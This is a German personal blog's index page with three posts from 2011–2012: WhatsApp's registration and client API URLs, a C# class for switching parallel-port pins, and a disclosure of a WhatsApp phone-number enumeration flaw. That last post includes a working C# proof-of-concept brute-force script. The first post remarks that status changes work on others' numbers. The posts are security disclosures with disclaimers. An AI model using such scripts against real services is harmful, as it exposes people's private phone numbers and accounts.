<!DOCTYPE html>
<html lang="de"><head>
	<meta name="generator" content="Hugo 0.108.0">
    
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="keywords" content="Johannes Mittendorfer, Mittendorfer, Blog, Informatik, Entwicklung, Security">
    <meta name="description" content="Der Blog von Johannes Mittendorfer über Software, IT-Security und das Internet">
    <meta name="author" content="Johannes Mittendorfer">
    <meta http-equiv="cleartype" content="on">
    <meta name="HandheldFriendly" content="True">
    <meta name="MobileOptimized" content="320">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1">
    <meta name="application-name" content="Johannes Mittendorfer"/>
    <meta name="msapplication-TileColor" content="#f9fbf4"/>
    <meta http-equiv="imagetoolbar" content="false" />
    <meta property="fb:admins" content="100000063853580" />
    <meta name="Content-Language" content="de" />
    
    <link rel="shortcut icon" href="/assets/favicon.ico">
    <link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.xml">
    <link rel="canoncial" href="https://blog.johannes-mittendorfer.com/">
    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.css" integrity="sha384-vKruj+a13U8yHIkAyGgK1J3ArTLzrFGBbBc0tDp4ad/EyewESeXE/Iv67Aj8gKZ0" crossorigin="anonymous">
    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.js" integrity="sha384-PwRUT/YqbnEjkZO0zZxNqcxACrXe+j766U2amXcgMg5457rve2Y7I6ZJSm2A0mS4" crossorigin="anonymous"></script>
    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
    
    
    <link rel="stylesheet" href="https://blog.johannes-mittendorfer.com/styles.min.f93f4e51d7d393b46e7874802b06d820d7f22d0b5b68cecd9c431a0bb299bb42.css">
    
    
    
    <title>Johannes Mittendorfer</title>
    
</head><body itemscope itemtype="http://schema.org/WebSite">
<nav id="bar">
    <section class="container">
        <a class="title" itemprop="url" href="/">
            <h1 itemprop="name">Johannes Mittendorfer</h1>
        </a>
        <ul>
            
            <li>
                <a href="/">
                    Start
                </a>
            </li>
            
            <li>
                <a href="/ueber-mich">
                    Über
                </a>
            </li>
            
            <li>
                <a href="/astronomie">
                    Astronomie
                </a>
            </li>
            
            <li>
                <a href="/impressum">
                    Impressum
                </a>
            </li>
            
        </ul>
    </section>
</nav>
        <div class="container">
            <main>
<div id="article-list" itemscope itemtype="http://schema.org/Blog">
    <meta itemprop="description" content="Blog von Johannes Mittendorfer"/>
    <meta itemprop="about" content="https://johannes-mittendorfer.com/ueber-mich"/>
    <meta itemprop="author" content="https://johannes-mittendorfer.com/ueber-mich"/>

    
    
    <article itemscope itemtype="http://schema.org/BlogPosting">
        <header>
            <div class="meta">
                <span class="category">Security</span> &ndash; 
                <time itemprop="datePublished" datetime="2012-02-09 00:00:00 &#43;0000 UTC" class="date">09.02.2012</time> &ndash;
                <a itemprop="author" href="https://blog.johannes-mittendorfer.com/ueber-mich">Johannes Mittendorfer</a>
            </div>
            <a href="/artikel/2012/02/das-whatsapp-registrierungsprotokoll/">
              <h2 itemprop="headline">Das WhatsApp-Registrierungsprotokoll</h2>
            </a>

            
            <div class="warning">
                Dieser Artikel ist älter als zwei Jahre und womöglich veraltet!
            </div>
            
        </header>
        <div itemprop="articleBody">
            <p><p>Da ich aus den Suchanfragen die auf meiner Homepage landen schließe, dass hier Interesse besteht, möchte ich hiermit nocheinmal kurz den Registrierungsvorgang bei WhatsApp mit den dafür verwendeten REST Urls beschreiben.</p>
<p><img src="/img/picture_75.jpeg" alt="Whatsapp Logo"></p>
<h2 id="überprüfen-ob-schon-registriert">Überprüfen, ob schon registriert</h2>
<p>Beim Starten der App und nach der Eingabe der Rufnummer wird zunächst überprüft, ob diese Nummer bereits bei WhatsApp registriert ist.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>https://r.whatsapp.net/v1/exist.php?cc=43&amp;in=664XXXXXXX&amp;udid=d59d27f4d300d595..
</span></span></code></pre></div><h2 id="bestätigungs-sms-verschicken">Bestätigungs-SMS verschicken</h2>
<p>Um die Rufnummer zu bestätigen wird im nächsten Schritt eine SMS an die angegebene Nummer verschickt.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>https://r.whatsapp.net/v1/code.php?method=sms&amp;to=43664XXXXXXX&amp;in=664XXXXXXX&amp;cc=43&amp;lg=de
</span></span><span style="display:flex;"><span>c=AT&amp;mcc=000&amp;mnc=000
</span></span></code></pre></div><h2 id="registrierung">Registrierung</h2>
<p>Zur entgültigen Registrierung wird nun folgende Anfrage mit dem Bestätigungscode aus der SMS abgeschickt:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>https://r.whatsapp.net/v1/register.php?cc=43&amp;in=664XXXXXXX&amp;udid=d59d27f4d300d595...&amp;code=774
</span></span></code></pre></div><p>Nach diesem Vorgang ist die Registrierung für ein WhatsApp-Konto abgeschlossen und der Benutzer kann von anderen Anwendern der App gefunden werden. Wie dieser und andere Vorgänge bei der Verwendung der App funktionieren, beschreibe ich im Folgenden:</p>
<h2 id="kontake-hochladen">Kontake hochladen</h2>
<p>Um diese Kontakte zu finden werden die Telefonnummern der Kontakte auf einen WhatsApp-Server übertragen. Den Vorgang habe ich außerdem schon <a href="http://johannes-mittendorfer.com/artikel/2011/12/whatsapp-erlaubt-bruteforce-auf-telefonnummern">hier</a> beschrieben und <a href="http://futurezone.at/produkte/7319-schwere-sicherheitsluecken-in-messenger-apps.php">hier</a> gibt es einen Artikel darüber.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>https://sro.whatsapp.net/client/iphone/iq.php?cd=1&amp;c=43&amp;u[]=0664XXXXXXX&amp;u[]=0699XXXXXXX
</span></span></code></pre></div><p><img src="/img/picture_76.png" alt="Whatsapp App"></p>
<h2 id="status-ändern">Status ändern</h2>
<p>Seinen aktuellen Status kann man über folgende Abfrage ändern. Aber nicht nur seinen eigenen Status.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>POST https://s.whatsapp.net/client/iphone/u.php 
</span></span><span style="display:flex;"><span>cc=43&amp;me=+43664XXXXXXX&amp;s=Hey%20there!%20I%20am%20using%20WhatsApp
</span></span></code></pre></div><h2 id="bild-upload">Bild-Upload</h2>
<p>Um Bilder an seine Kontake zu verschicken werden diese durch folgende Abfrage hochgeladen. Wie der Name &ldquo;89b49902234aa5afc2bdff95bfa0c3fd.jpg&rdquo; zustande kommt ist mir noch nicht ganz klar.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>POST http://mms.whatsapp.net/client/iphone/upload.php
</span></span><span style="display:flex;"><span>------WebKitFormBoundaryCPJPtl1Gsxx5Dr12
</span></span><span style="display:flex;"><span>Content-Disposition: attachment; name=&#34;file&#34; filename=&#34;89b49902234aa5afc2bdff95bfa0c3fd.jpg&#34;
</span></span><span style="display:flex;"><span>Content-Type: image/jpeg
</span></span></code></pre></div><h2 id="bilder-download">Bilder-Download</h2>
<p>Das hochgeladene Bild kann nun über diese Adresse wieder erreicht werden:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>https://mms401.whatsapp.net/d4/31/06/3/7/37b1703abfdc2a9c6e1f005e3134c271.jpg
</span></span></code></pre></div><p>Die Bilder werden jedoch <a href="https://mms401.whatsapp.net/d4/31/06/3/7/37b1703abfdc2a9c6e1f005e3134c271.jpg">augenscheinlich</a> nach einiger Zeit wieder gelöscht.</p>
<h2 id="hinweis">Hinweis</h2>
<p>Ich rufe hiermit ausdrücklich <strong>nicht</strong> zu einem Missbrauch des Dienstes aus und verfolge mit diesem Artikel nur über die Sicherheit der übertragung persönlicher Daten zu informieren.</p>
<h2 id="update-10-februar-2012">Update (10. Februar 2012)</h2>
<p>Angeblich wurden mehrere Sicherheitslücken von WhatsApp inzwischen gestopft.</p>
</p>
        </div>
    </article>
    
    <article itemscope itemtype="http://schema.org/BlogPosting">
        <header>
            <div class="meta">
                <span class="category">Entwicklung</span> &ndash; 
                <time itemprop="datePublished" datetime="2012-01-05 00:00:00 &#43;0000 UTC" class="date">05.01.2012</time> &ndash;
                <a itemprop="author" href="https://blog.johannes-mittendorfer.com/ueber-mich">Johannes Mittendorfer</a>
            </div>
            <a href="/artikel/2012/01/elektronik-%C3%BCber-den-lpt-port-steuern/">
              <h2 itemprop="headline">Elektronik über den LPT-Port steuern</h2>
            </a>

            
            <div class="warning">
                Dieser Artikel ist älter als zwei Jahre und womöglich veraltet!
            </div>
            
        </header>
        <div itemprop="articleBody">
            <p><p>Öfters möchte man einen kleinen oder auch größeren Schaltkreis über den PC steuern, wäre da nicht die komplizierte Umsetzung mit einem geeigneten Mikrocontroller und der benötigten Software.</p>
<p>Doch es geht viel einfacher: Der parellele Port, auch LPT-Port genannt, steht auf den meisten PC zur Verfügung und kann Kinderleicht dazu verwendet werden verschiedenen Pins einzeln mit Spannung zu versorgen.</p>
<h2 id="hardware">Hardware</h2>
<p><img src="/img/picture_73.png" alt="Port des parallelen Anschlusses"></p>
<p>Dieser Anschluss, der vormals DER Standard für den Anschluss eines Druckers war, lässt sich für die Steuerung eines Schaltkreises verwenden indem man einen Draht in einen der Pins 2-9 und einen Draht in einen Pin von 18 bis 25 steckt.</p>
<p>Die Pins 2 bis 9 können einzeln vom PC mit Spannung geschaltet werden und stellen eine (Steuer-)Spannung von ca. 5 V bereit. Diese Spannung <!-- raw HTML omitted -->kann<!-- raw HTML omitted --> sollte mit einem Transistor verwendet werden, um über einen Steuerstromkreis den Arbeitsstromkreis mit (nahezu) beliebiger Spannung zu betreiben.</p>
<p>Außerdem kann über die Pins 10-13 ein Signal enpfangen werden, was in diesem Fall bedeutet, dass der Stromkreis geschlossen ist und Strom von den Pins 18-25 zu den Pins 10-13 fließt.</p>
<p>Ein LPT-Kabel, das in meinem Fall einen alten Drucker mit Daten versorgte, verlegt den Anschluss bequem nach vorne und erspart einem so manchen Schlag mit dem Kopf gegen die Tischplatte.</p>
<h2 id="software">Software</h2>
<p>Beispiel eines TCP-Clients zum Steuern einer LED:</p>
<p><img src="/img/picture_74.png" alt="Beispiel GUI"></p>
<p>Für das einfache Anlegen einer Spannung auf einem Pin empfehle ich das Programme lptout.exe. Für komplexere Aufgaben ist jedoch die Klasse inpout32.dll bzw. inpout64.dll geeignet. Da ich keine Rechte für die genannten Programme besitze, möchte ich nicht auf einen Download verlinken, doch eine Google-Suche bringt einem schnell ans Ziel.</p>
<p>Ich habe mir für leichtere Handhabung eine kleine C#-Klasse geschrieben:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cs" data-lang="cs"><span style="display:flex;"><span><span style="color:#00f">using</span> <span style="color:#000">System</span>;
</span></span><span style="display:flex;"><span><span style="color:#00f">using</span> <span style="color:#000">System.Collections.Generic</span>;
</span></span><span style="display:flex;"><span><span style="color:#00f">using</span> <span style="color:#000">System.Linq</span>;
</span></span><span style="display:flex;"><span><span style="color:#00f">using</span> <span style="color:#000">System.Text</span>;
</span></span><span style="display:flex;"><span><span style="color:#00f">using</span> <span style="color:#000">System.Runtime.InteropServices</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#00f">namespace</span> <span style="color:#000">WindowsFormsApplication1</span>{
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#00f">public</span> <span style="color:#00f">class</span> <span style="color:#000">LPTController</span>{
</span></span><span style="display:flex;"><span><span style="color:#000">
</span></span></span><span style="display:flex;"><span><span style="color:#000">		[DllImport(&#34;inpout32.dll&#34;)]</span>
</span></span><span style="display:flex;"><span>		<span style="color:#00f">private</span> <span style="color:#00f">static</span> <span style="color:#00f">extern</span> <span style="color:#000">UInt32</span> <span style="color:#000">IsInpOutDriverOpen</span>();
</span></span><span style="display:flex;"><span><span style="color:#000">
</span></span></span><span style="display:flex;"><span><span style="color:#000">		[DllImport(&#34;inpout32.dll&#34;)]</span>
</span></span><span style="display:flex;"><span>		<span style="color:#00f">private</span> <span style="color:#00f">static</span> <span style="color:#00f">extern</span> <span style="color:#00f">void</span> <span style="color:#000">Out32</span>(<span style="color:#00f">short</span> <span style="color:#000">PortAddress</span>, <span style="color:#00f">short</span> <span style="color:#000">Data</span>);
</span></span><span style="display:flex;"><span><span style="color:#000">
</span></span></span><span style="display:flex;"><span><span style="color:#000">		[DllImport(&#34;inpout32.dll&#34;)]</span>
</span></span><span style="display:flex;"><span>		<span style="color:#00f">private</span> <span style="color:#00f">static</span> <span style="color:#00f">extern</span> <span style="color:#00f">char</span> <span style="color:#000">Inp32</span>(<span style="color:#00f">short</span> <span style="color:#000">PortAddress</span>);
</span></span><span style="display:flex;"><span><span style="color:#000">
</span></span></span><span style="display:flex;"><span><span style="color:#000">		[DllImport(&#34;inpout32.dll&#34;)]</span>
</span></span><span style="display:flex;"><span>		<span style="color:#00f">private</span> <span style="color:#00f">static</span> <span style="color:#00f">extern</span> <span style="color:#00f">void</span> <span style="color:#000">DlPortWritePortUshort</span>(<span style="color:#00f">short</span> <span style="color:#000">PortAddress</span>, <span style="color:#00f">ushort</span> <span style="color:#000">Data</span>);
</span></span><span style="display:flex;"><span><span style="color:#000">
</span></span></span><span style="display:flex;"><span><span style="color:#000">		[DllImport(&#34;inpout32.dll&#34;)]</span>
</span></span><span style="display:flex;"><span>		<span style="color:#00f">private</span> <span style="color:#00f">static</span> <span style="color:#00f">extern</span> <span style="color:#00f">ushort</span> <span style="color:#000">DlPortReadPortUshort</span>(<span style="color:#00f">short</span> <span style="color:#000">PortAddress</span>);
</span></span><span style="display:flex;"><span><span style="color:#000">
</span></span></span><span style="display:flex;"><span><span style="color:#000">		[DllImport(&#34;inpout32.dll&#34;)]</span>
</span></span><span style="display:flex;"><span>		<span style="color:#00f">private</span> <span style="color:#00f">static</span> <span style="color:#00f">extern</span> <span style="color:#00f">void</span> <span style="color:#000">DlPortWritePortUlong</span>(<span style="color:#00f">int</span> <span style="color:#000">PortAddress</span>, <span style="color:#00f">uint</span> <span style="color:#000">Data</span>);
</span></span><span style="display:flex;"><span><span style="color:#000">
</span></span></span><span style="display:flex;"><span><span style="color:#000">		[DllImport(&#34;inpout32.dll&#34;)]</span>
</span></span><span style="display:flex;"><span>		<span style="color:#00f">private</span> <span style="color:#00f">static</span> <span style="color:#00f">extern</span> <span style="color:#00f">uint</span> <span style="color:#000">DlPortReadPortUlong</span>(<span style="color:#00f">int</span> <span style="color:#000">PortAddress</span>);
</span></span><span style="display:flex;"><span><span style="color:#000">
</span></span></span><span style="display:flex;"><span><span style="color:#000">		[DllImport(&#34;inpoutx64.dll&#34;)]</span>
</span></span><span style="display:flex;"><span>		<span style="color:#00f">private</span> <span style="color:#00f">static</span> <span style="color:#00f">extern</span> <span style="color:#00f">bool</span> <span style="color:#000">GetPhysLong</span>(<span style="color:#00f">ref</span> <span style="color:#00f">int</span> <span style="color:#000">PortAddress</span>, <span style="color:#00f">ref</span> <span style="color:#00f">uint</span> <span style="color:#000">Data</span>);
</span></span><span style="display:flex;"><span><span style="color:#000">
</span></span></span><span style="display:flex;"><span><span style="color:#000">		[DllImport(&#34;inpoutx64.dll&#34;)]</span>
</span></span><span style="display:flex;"><span>		<span style="color:#00f">private</span> <span style="color:#00f">static</span> <span style="color:#00f">extern</span> <span style="color:#00f">bool</span> <span style="color:#000">SetPhysLong</span>(<span style="color:#00f">ref</span> <span style="color:#00f">int</span> <span style="color:#000">PortAddress</span>, <span style="color:#00f">ref</span> <span style="color:#00f">uint</span> <span style="color:#000">Data</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#00f">private</span> <span style="color:#00f">bool</span> <span style="color:#000">_X64</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#00f">private</span> <span style="color:#00f">short</span> <span style="color:#000">_PortAddress</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#00f">public</span> <span style="color:#000">LPTController</span>(<span style="color:#00f">short</span> <span style="color:#000">PortAddress</span>){
</span></span><span style="display:flex;"><span>			<span style="color:#000">_X64</span> = <span style="color:#00f">false</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#000">_PortAddress</span> = <span style="color:#000">PortAddress</span>;
</span></span><span style="display:flex;"><span>		
</span></span><span style="display:flex;"><span>			<span style="color:#00f">try</span>{
</span></span><span style="display:flex;"><span>				<span style="color:#00f">uint</span> <span style="color:#000">nResult</span> = <span style="color:#3af">0</span>;
</span></span><span style="display:flex;"><span>				<span style="color:#00f">try</span>{
</span></span><span style="display:flex;"><span>					<span style="color:#000">nResult</span> = <span style="color:#000">IsInpOutDriverOpen</span>();
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>				<span style="color:#00f">catch</span> (<span style="color:#000">BadImageFormatException</span>){
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>				<span style="color:#00f">if</span> (<span style="color:#000">nResult</span> == <span style="color:#3af">0</span>){
</span></span><span style="display:flex;"><span>					<span style="color:#00f">throw</span> <span style="color:#00f">new</span> <span style="color:#000">ArgumentException</span>(<span style="color:#5a2">&#34;Unable to open InpOut32 driver&#34;</span>);
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			<span style="color:#00f">catch</span> (<span style="color:#000">DllNotFoundException</span>){
</span></span><span style="display:flex;"><span>				<span style="color:#00f">throw</span> <span style="color:#00f">new</span> <span style="color:#000">ArgumentException</span>(<span style="color:#5a2">&#34;Unable to find InpOut32.dll&#34;</span>);
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		
</span></span><span style="display:flex;"><span>		<span style="color:#00f">public</span> <span style="color:#00f">void</span> <span style="color:#000">Write</span>(<span style="color:#00f">short</span> <span style="color:#000">Data</span>){
</span></span><span style="display:flex;"><span>			<span style="color:#000">Out32</span>(<span style="color:#000">_PortAddress</span>, <span style="color:#000">Data</span>);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#00f">public</span> <span style="color:#00f">byte</span> <span style="color:#000">Read</span>(){
</span></span><span style="display:flex;"><span>			<span style="color:#00f">return</span> (<span style="color:#00f">byte</span>)<span style="color:#000">Inp32</span>(<span style="color:#000">_PortAddress</span>);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Mit dieser Klasse kann man einfach den Zustand Auslesen und ihn ändern:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cs" data-lang="cs"><span style="display:flex;"><span><span style="color:#000">LPTController</span> <span style="color:#000">lpt</span> = <span style="color:#00f">new</span> <span style="color:#000">LPTController</span>(<span style="color:#3af">888</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#00f">if</span>(<span style="color:#000">lpt</span>.<span style="color:#000">Read</span>() == <span style="color:#3af">255</span>){
</span></span><span style="display:flex;"><span>	<span style="color:#000">lpt</span>.<span style="color:#000">Write</span>(<span style="color:#3af">0</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#00f">else</span>{
</span></span><span style="display:flex;"><span>	<span style="color:#000">lpt</span>.<span style="color:#000">Write</span>(<span style="color:#3af">255</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="hinweis">Hinweis</h2>
<p>Natürlich geschieht das alles auf Ihre eigene Gefahr und ich übernehme keine Haftung für jedwede Schäden an Gerät und Gesundheit. 230V haben hier nichts verloren!!!</p>
<p>Update 13.03.2016: Natürlich muss es der parallele und nicht der serielle Port.</p>
</p>
        </div>
    </article>
    
    <article itemscope itemtype="http://schema.org/BlogPosting">
        <header>
            <div class="meta">
                <span class="category">Security</span> &ndash; 
                <time itemprop="datePublished" datetime="2011-12-03 00:00:00 &#43;0000 UTC" class="date">03.12.2011</time> &ndash;
                <a itemprop="author" href="https://blog.johannes-mittendorfer.com/ueber-mich">Johannes Mittendorfer</a>
            </div>
            <a href="/artikel/2011/12/whatsapp-erlaubt-bruteforce-auf-telefonnummern/">
              <h2 itemprop="headline">WhatsApp erlaubt Bruteforce auf Telefonnummern</h2>
            </a>

            
            <div class="warning">
                Dieser Artikel ist älter als zwei Jahre und womöglich veraltet!
            </div>
            
        </header>
        <div itemprop="articleBody">
            <p><p>Eine Telefonnummer möchte man meist gerne für sich behalten, um nicht von Personen belästigt zu werden und einfach seine Ruhe zu haben. Mit der Nutzung der weitverbreiteten WhatsApp-Anwendung auf seinem Mobiltelefon macht man jedoch möglich die Rufnummern der angemeldeten Benutzer zu durchsuchen. In der App wird angezeigt welche seiner Kontakte bereits für WhatsApp registriert sind.</p>
<p>Dazu wird eine Anfrage mit den Telefonnummern seiner Kontakte an den WhatsApp-Server <em>sro.whatsapp.net</em> geschickt:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>POST /client/iphone/iq.php HTTP/1.1 
</span></span><span style="display:flex;"><span>Host: sro.whatsapp.net 
</span></span><span style="display:flex;"><span>User-Agent: WhatsApp/2.6.7 iPhone_OS/4.3.3 Device/iPhone 
</span></span><span style="display:flex;"><span>Accept: */* 
</span></span><span style="display:flex;"><span>Accept-Language: de-de 
</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate 
</span></span><span style="display:flex;"><span>Content-Type: application/x-www-form-urlencoded 
</span></span><span style="display:flex;"><span>Content-Length: 710 
</span></span><span style="display:flex;"><span>Connection: keep-alive 
</span></span><span style="display:flex;"><span>Proxy-Connection: keep-alive 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cd=1&amp;amp;cc=43&amp;amp;me=664XXXXXXX&amp;amp;u[]=0699XXXXXXX&amp;amp;u[]=0680XXXXXXX
</span></span></code></pre></div><p>Im Body der POST-Anfrage an <code>/client/iphone/iq.php</code> werden die Telefonnummern als Array (?) in der Form des GET-Parameters <code>u[]=XXXXXXXXXXX</code> übermittelt. Der Parameter <em>me</em> muss jedoch nicht angegeben werden. Zudem darf die Anfrage auch über <em>GET</em> erfolgen. Auf die Anfrage antwortet der Server mit dem Status der Teilnehmer im plist-Format:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#000">&lt;plist</span> <span style="color:#000">version=</span><span style="color:#5a2">&#34;1.0&#34;</span><span style="color:#000">&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#000">&lt;array&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#000">&lt;dict&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="color:#000">&lt;key&gt;</span>P<span style="color:#000">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="color:#000">&lt;string&gt;</span>0043664.......<span style="color:#000">&lt;/string&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="color:#000">&lt;key&gt;</span>T<span style="color:#000">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="color:#000">&lt;integer&gt;</span>199610<span style="color:#000">&lt;/integer&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="color:#000">&lt;key&gt;</span>S<span style="color:#000">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="color:#000">&lt;string&gt;</span>....<span style="color:#000">&lt;/string&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="color:#000">&lt;key&gt;</span>JID<span style="color:#000">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="color:#000">&lt;string&gt;</span>43664.......<span style="color:#000">&lt;/string&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#000">&lt;/dict&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#000">&lt;/array&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#000">&lt;/plist&gt;</span>
</span></span></code></pre></div><p>So ist es natürlich auch möglich einen Brute-Force Angriff auf Handynummern zu starten, und das funktioniert auch. Man kann zum Beispiel hundert Nummern generieren lassen, die man dann alle zusammen an den WhatsApp-Server übermittelt. Daraufhin erhält man alle Benutzer in diesem Bereich, die WhatsApp benutzen. Als ein Proof-of-Concept habe ich ein kleines Programm in C# zusammengestöpselt, das Telefonnummern aus einem bestimmten Bereich generiert und diese anschließ;end an den passenden WhatsApp-Server schickt. Anschließ;end wird der Inhalt der plist-Datei in der Konsole ausgegeben.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cs" data-lang="cs"><span style="display:flex;"><span><span style="color:#00f">using</span> <span style="color:#000">System</span>; 
</span></span><span style="display:flex;"><span><span style="color:#00f">using</span> <span style="color:#000">System.Collections.Generic</span>; 
</span></span><span style="display:flex;"><span><span style="color:#00f">using</span> <span style="color:#000">System.Linq</span>; 
</span></span><span style="display:flex;"><span><span style="color:#00f">using</span> <span style="color:#000">System.Text</span>; 
</span></span><span style="display:flex;"><span><span style="color:#00f">using</span> <span style="color:#000">System.Net</span>; 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#00f">namespace</span> <span style="color:#000">WhatsAppBrute</span>{
</span></span><span style="display:flex;"><span>	<span style="color:#00f">class</span> <span style="color:#000">Program</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#00f">static</span> <span style="color:#00f">void</span> <span style="color:#000">Main</span>(<span style="color:#00f">string</span>[] <span style="color:#000">args</span>){
</span></span><span style="display:flex;"><span>			<span style="color:#000">WebClient</span> <span style="color:#000">c</span> = <span style="color:#00f">new</span> <span style="color:#000">WebClient</span>(); 
</span></span><span style="display:flex;"><span>			<span style="color:#000">String</span> <span style="color:#000">start</span> = <span style="color:#5a2">&#34;https://sro.whatsapp.net/client/iphone/iq.php?cd=1&amp;amp;cc=43&#34;</span> 
</span></span><span style="display:flex;"><span>			
</span></span><span style="display:flex;"><span>			<span style="color:#00f">for</span> (<span style="color:#000">Int32</span> <span style="color:#000">i</span> = <span style="color:#3af">0</span>; <span style="color:#000">i</span> &amp;<span style="color:#000">lt</span>; <span style="color:#3af">100</span>; <span style="color:#000">i</span>++){
</span></span><span style="display:flex;"><span>				<span style="color:#000">String</span> <span style="color:#000">count</span>; 
</span></span><span style="display:flex;"><span>				
</span></span><span style="display:flex;"><span>				<span style="color:#00f">if</span>(<span style="color:#000">i</span> &lt; <span style="color:#3af">10</span>){
</span></span><span style="display:flex;"><span>					<span style="color:#000">count</span> = <span style="color:#5a2">&#34;0&#34;</span> + <span style="color:#000">i</span>.<span style="color:#000">ToString</span>(); 
</span></span><span style="display:flex;"><span>				} 
</span></span><span style="display:flex;"><span>				<span style="color:#00f">else</span> { 
</span></span><span style="display:flex;"><span>					<span style="color:#000">count</span> = <span style="color:#000">i</span>.<span style="color:#000">ToString</span>(); 
</span></span><span style="display:flex;"><span>				} 
</span></span><span style="display:flex;"><span>				
</span></span><span style="display:flex;"><span>				<span style="color:#000">start</span> += <span style="color:#5a2">&#34;&amp;u[]=0664XXXXX&#34;</span> + <span style="color:#000">count</span>; 
</span></span><span style="display:flex;"><span>			} 
</span></span><span style="display:flex;"><span>			
</span></span><span style="display:flex;"><span>			<span style="color:#000">Console</span>.<span style="color:#000">WriteLine</span>(<span style="color:#000">c</span>.<span style="color:#000">DownloadString</span>(<span style="color:#000">start</span>)); 
</span></span><span style="display:flex;"><span>			<span style="color:#000">Console</span>.<span style="color:#000">ReadLine</span>(); 
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	} 
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><strong>Dieser Code dient nur zu Vorführzwecken und darf nicht für einen Angriff auf die Server von WhatsApp verwendet werden!</strong></p>
<p>Fazit: Es ist erschreckend wie einfach eine solche Anfrage ausgeführt werden kann und wie freizügig mit den Telefonnummern umgegangen wird. Natürlich wird nicht jeder Benutzer eine so umständliche Art benutzen (wollen), aber es ist möglich.</p>
</p>
        </div>
    </article>
    
    <article itemscope itemtype="http://schema.org/BlogPosting">
        <header>
            <div class="meta">
                <span class="category">Entwicklung</span> &ndash; 
                <time itemprop="datePublished" datetime="2011-10-19 00:00:00 &#43;0000 UTC" class="date">19.10.2011</time> &ndash;
